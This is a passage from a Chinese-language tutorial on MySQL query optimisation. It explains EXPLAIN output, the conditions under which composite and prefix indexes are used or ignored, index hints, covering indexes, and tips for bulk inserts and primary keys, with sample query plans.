<li>rows<br>MySQL认为必须要执行查询的行数，在InnoDB表中，是一个估计值，可能并不总是准确的</li>
<li>filtered<br>表示返回结果的行数占需读取行数百分比，filtered值越大越好</li>
</ul>
<p>例: explain type &#x3D; NULL (没有查表)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select &#x27;A&#x27;;</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra          |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">|  1 | SIMPLE      | NULL  | NULL       | NULL | NULL          | NULL | NULL    | NULL | NULL |     NULL | No tables used |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br></pre></td></tr></table></figure>
<p>例: explain type &#x3D; const (走主键索引&#x2F;唯一索引)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select name from tb_user where id = 1;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br></pre></td></tr></table></figure>
<p>例: explain type &#x3D; ref (走普通的非唯一索引)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select name from tb_user where name = &#x27;uXrBh&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key           | key_len | ref   | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_name | idx_user_name | 43      | const |    1 |   100.00 | Using index |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h2><span id="索引应用">索引应用</span></h2><h3><span id="最左前缀法则">最左前缀法则</span></h3><ul>
<li>对于索引了多列的场景，最左前缀法则指查询从索引的最左列开始，且不跳过索引中的列</li>
<li>如果跳跃某一列，索引将部分失效(后面字段索引失效)</li>
</ul>
<p>例：先查看tb_user表的索引</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> index <span class="keyword">from</span> tb_user;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>   <span class="operator">|</span> Non_unique <span class="operator">|</span> Key_name             <span class="operator">|</span> Seq_in_index <span class="operator">|</span> Column_name <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> <span class="keyword">Cardinality</span> <span class="operator">|</span> Sub_part <span class="operator">|</span> Packed <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Index_type <span class="operator">|</span> Comment <span class="operator">|</span> Index_comment <span class="operator">|</span> Visible <span class="operator">|</span> Expression <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span> <span class="keyword">PRIMARY</span>              <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> id          <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">245768</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span>      <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_name        <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> name        <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">269997</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_pro_age_sta <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> profession  <span class="operator">|</span> A         <span class="operator">|</span>           <span class="number">3</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_pro_age_sta <span class="operator">|</span>            <span class="number">2</span> <span class="operator">|</span> age         <span class="operator">|</span> A         <span class="operator">|</span>         <span class="number">535</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_pro_age_sta <span class="operator">|</span>            <span class="number">3</span> <span class="operator">|</span> status      <span class="operator">|</span> A         <span class="operator">|</span>        <span class="number">1051</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_phone       <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> phone       <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">271498</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tb_user <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> idx_user_email       <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> email       <span class="operator">|</span> A         <span class="operator">|</span>      <span class="number">269341</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br></pre></td></tr></table></figure>
<p>例: 符合最左前缀法则，走联合索引(profession,age,status)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27; and age = 31 and status = 1;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  261 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br></pre></td></tr></table></figure>
<p>例：查询条件改成只有profession，仍然走联合索引(profession,age,status)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 147     | const | 127438 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
<p>例：查询条件改成age, status，索引失效，走了全表扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where age = 31 and status = 1;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |     1.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>
<p>例：查询条件改成profession, status，索引部分失效，只有profession走了索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27; and status = 1;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref   | rows   | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 147     | const | 127438 |    10.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-----------------------+</span><br></pre></td></tr></table></figure>
<p>例：查询条件改成age, status, profession, 走联合索引(profession,age,status) (只要存在即可，和语句中的先后位置无关)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explain select * from tb_user where age = 31 and status = 1 and profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  261 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br></pre></td></tr></table></figure>

<h3><span id="范围查询">范围查询</span></h3><p>联合索引中，出现范围查询，则范围查询右侧的列索引失效</p>
<p>例: age使用了范围查询，status没有走索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;软件工程&#x27; and age &gt; 30 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys        | key                  | key_len | ref  | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | range | idx_user_pro_age_sta | idx_user_pro_age_sta | 149     | NULL |    1 |    10.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br></pre></td></tr></table></figure>
<p>例：把 age &gt; 30 改成 age &gt;&#x3D; 30，都可以走索引 (业务允许情况下，尽量用&gt;&#x3D;代替&gt;)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;软件工程&#x27; and age &gt;= 30 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys        | key                  | key_len | ref  | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | range | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | NULL |    1 |    10.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------------+----------------------+---------+------+------+----------+-----------------------+</span><br></pre></td></tr></table></figure>

<h3><span id="在索引列上进行运算索引会失效">在索引列上进行运算，索引会失效</span></h3><p>例: 对phone做substring运算，发现索引失效, type &#x3D; ALL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone = &#x27;10931949622&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------+----------------+---------+-------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys  | key            | key_len | ref   | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+----------------+---------+-------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_phone | idx_user_phone | 45      | const |    1 |   100.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+----------------+---------+-------+------+----------+-----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select * from tb_user where substring(phone,10,2) = &#x27;22&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |   100.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h3><span id="字符串不加引号">字符串不加引号</span></h3><p>字符串类型字段使用时，不加引号，索引将失效。</p>
<p>例：查询手机号时，忘了加引号，也能查出结果，但索引失效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone = 10931949622;</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys  | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | idx_user_phone | NULL | NULL    | NULL | 271498 |    10.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h3><span id="头部模糊匹配索引失效">头部模糊匹配，索引失效</span></h3><p>例: like查询手机号。使用头部模糊匹配’%262’，索引失效；尾部模糊匹配’109%’，索引有效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone like &#x27;109%&#x27;;</span><br><span class="line">+----+-------------+---------+------------+-------+----------------+----------------+---------+------+------+----------+-----------------------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys  | key            | key_len | ref  | rows | filtered | Extra                 |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------+----------------+---------+------+------+----------+-----------------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | range | idx_user_phone | idx_user_phone | 45      | NULL | 2713 |   100.00 | Using index condition |</span><br><span class="line">+----+-------------+---------+------------+-------+----------------+----------------+---------+------+------+----------+-----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select * from tb_user where phone like &#x27;%622&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 271498 |    11.11 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h3><span id="or连接的条件">or连接的条件</span></h3><p>用or分割开的条件，如果or前条件中列有索引，or后条件没有索引，查询不会走索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where phone = &#x27;10931949622&#x27; or age = 23;</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys  | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | idx_user_phone | NULL | NULL    | NULL | 271498 |    10.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+----------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h3><span id="数据分布情况也会影响是否使用索引">数据分布情况也会影响是否使用索引</span></h3><p>如果MySQL评估使用索引比全表更慢，则不使用索引</p>
<p>例: tb_user表数据profression都是not null的，使用where is not null查询没有走索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession is not null ;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key  | key_len | ref  | rows   | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+------+---------+------+--------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ALL  | idx_user_pro_age_sta | NULL | NULL    | NULL | 271498 |    50.00 | Using where |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+------+---------+------+--------+----------+-------------+</span><br></pre></td></tr></table></figure>

<h3><span id="索引提示">索引提示</span></h3><p>SQL提示，是优化数据库的重要手段。指在SQL语句中加入一些认为提示来达到优化操作的目的。</p>
<p>例：先创建一个profession单列索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create index idx_user_pro on tb_user(profession);</span><br></pre></td></tr></table></figure>
<p>再查询profession为’R&amp;D’的员工。MySQL可以用普通索引idx_user_pro，也可以用联合索引idx_user_pro_age_sta</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+-----------------------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys                     | key                  | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+-----------------------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta,idx_user_pro | idx_user_pro_age_sta | 147     | const | 127438 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+-----------------------------------+----------------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>

<p>use index (建议使用索引)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user use index(idx_user_pro) where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key          | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro  | idx_user_pro | 147     | const | 127772 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
<p>ignore index</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user ignore index(idx_user_pro) where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref   | rows   | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 147     | const | 127438 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------+--------+----------+-------+</span><br></pre></td></tr></table></figure>
<p>force index (强制使用索引)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from tb_user force index(idx_user_pro) where profession = &#x27;R&amp;D&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+-------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key          | key_len | ref   | rows  | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+-------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro  | idx_user_pro | 147     | const | 90499 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+--------------+---------+-------+-------+----------+-------+</span><br></pre></td></tr></table></figure>

<h3><span id="覆盖索引">覆盖索引</span></h3><p>查询使用到了索引，并且查询的所有列，在该索引中已经全部能够找到(不需要回表)</p>
<p>例: tb_user表已有联合索引(profession,age,status), 查询所有列在该索引中能找到时, Extra&#x3D;’Using index’，当查询字段新增name时，Extra&#x3D;’NULL’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select id,profession,age,status from tb_user where profession = &#x27;R&amp;D&#x27;  and age = 31 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  249 |   100.00 | Using index |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select id,profession,age,status,name from tb_user where profession = &#x27;R&amp;D&#x27;  and age = 31 and status = &#x27;0&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys        | key                  | key_len | ref               | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_pro_age_sta | idx_user_pro_age_sta | 154     | const,const,const |  249 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+------+----------------------+----------------------+---------+-------------------+------+----------+-------+</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ul>
<li>using index condition (查找使用了索引，但需要回表)</li>
<li>using where; using index; (查找使用了索引，且需要数据都能在索引列中找到，无需回表)</li>
</ul>
<p><strong>聚集索引和辅助索引</strong><br><img data-src="/2024/1016215805/mysql-cluster-index.png"><br>注：</p>
<ul>
<li>聚集索引</li>
<li>辅助索引 叶子节点存主键ID (聚集索引叶子节点已经存储行数据，没必要每个辅助索引也存一份行数据，只存主键ID节省空间)</li>
</ul>
<h3><span id="前缀索引">前缀索引</span></h3><p>当字段类型为字符串(varchar,text)时，可以只将字符串的一部分前缀，建立索引，这样可以大大节约索引空间，从而提高索引效率</p>
<p>语法:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> index idx_XXX <span class="keyword">on</span> table_name(<span class="keyword">column</span>(n));</span><br></pre></td></tr></table></figure>
<p>前缀长度<br>可以根据索引选择性决定，选择性指不重复索引值&#x2F;数据表记录总数，选择性越高说明查询效率越好<br>唯一索引选择性为1，是最好的索引选择性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(distinct substring(email, 1, 5)/count(*) from tb_user;</span><br></pre></td></tr></table></figure>
<p>例: 给email建立前缀索引，取长度为5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create index idx_email_5 on tb_user(email(5));</span><br></pre></td></tr></table></figure>

<h3><span id="单列索引与联合索引">单列索引与联合索引</span></h3><p>联合索引指一个索引包含了多个列。<br>业务场景中，如果存在多个查询条件，建议建立联合索引，而非单列索引。</p>
<h2><span id="sql优化">SQL优化</span></h2><h3><span id="插入数据">插入数据</span></h3><ul>
<li><p>批量插入，不要一条一条插入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test values(1),(2),(3);</span><br></pre></td></tr></table></figure></li>
<li><p>手动提交事务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">insert into tb_test values(1),(2),(3);</span><br><span class="line">insert into tb_test values(4),(5),(6);</span><br><span class="line">insert into tb_test values(7),(8),(9);</span><br><span class="line">commit;</span><br></pre></td></tr></table></figure></li>
<li><p>主键顺序插入</p>
</li>
<li><p>大批量插入数据，使用load指令加载本地文件到数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="comment">--local-infile -u root -p</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> local_infile <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">load data <span class="keyword">local</span> infile <span class="string">&#x27;*.log&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> `tb_user` fields terminated <span class="keyword">by</span> <span class="string">&#x27;,&#x27;</span> terminated <span class="keyword">by</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3><span id="主键优化">主键优化</span></h3><ul>
<li><p>页分裂<br><img data-src="/2024/1016215805/primary-key-opt.png"></p>
</li>
<li><p>页合并<br>删除一行记录时，实际上记录没有被物理删除，只是被标记为删除，当页中删除记录达到阈值(MERGE_THERSHOLD)，InnoDB会试图合并两个页以节省空间</p>
</li>
<li><p>主键设计原则<br>满足业务需求情况下，尽量降低主键长度<br>插入数据时，尽量选择顺序插入，选择使用AUTO_INCREMENT自增主键<br>尽量不使用UUID或其他自然主键(比如身份证号)</p>
</li>
</ul>
<h3><span id="order-by优化">order by优化</span></h3><p>using filesort: 在排序缓冲区sort buffer中完成排序操作，未通过索引直接返回排序结果<br>using index: 通过有序索引顺序扫描直接返回的，这种无需额外排序，效率较高</p>
<p>例: 没有建立索引，排序查询走Using filesort.</p>
